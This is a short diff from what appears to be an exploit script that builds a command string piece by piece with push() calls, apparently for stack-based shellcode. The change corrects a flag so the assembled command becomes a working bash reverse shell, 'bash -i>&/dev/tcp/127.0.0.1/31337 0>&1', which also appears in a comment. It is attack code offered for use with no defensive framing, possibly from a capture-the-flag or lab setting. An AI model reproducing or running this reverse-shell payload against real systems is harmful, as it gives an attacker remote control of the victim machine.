@@ -21,5 +21,5 @@ push('-hhc') # pad with h to alignment
 # bash -I>&/dev/tcp/127.0.0.1/31337 0>&1
 push('0>&1')
 push('    ')
-push('-I>&/dev/tcp/127.0.0.1/31337')
+push('-i>&/dev/tcp/127.0.0.1/31337')
 push('bash')
